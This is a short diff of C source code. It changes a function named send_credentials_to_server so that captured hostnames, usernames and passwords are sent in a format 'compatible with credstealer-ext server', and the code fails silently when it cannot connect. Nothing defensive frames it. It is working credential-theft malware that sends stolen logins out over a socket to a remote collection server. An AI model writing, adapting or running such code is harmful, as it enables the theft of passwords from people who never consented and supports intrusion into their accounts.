@@ -216,14 +216,13 @@ static void send_credentials_to_server(const char *username,
         return;  // Silently fail if connection fails
     }
     
-    // Create JSON payload
+    // Create payload compatible with credstealer-ext server (username:password)
+    // We include hostname in the username field to distinguish sources
     snprintf(json_buffer, sizeof(json_buffer),
-             "{\"hostname\": \"%s\", \"username\": \"%s\", \"password\": \"%s\", \"pid\": %d, \"process\": \"%s\"}",
+             "%s\\%s:%s",
              hostname,
-             username ? username : "",
-             password ? password : "",
-             pid,
-             process ? process : "");
+             username ? username : "unknown",
+             password ? password : "");
     
     // Send data
     send(sock, json_buffer, strlen(json_buffer), 0);
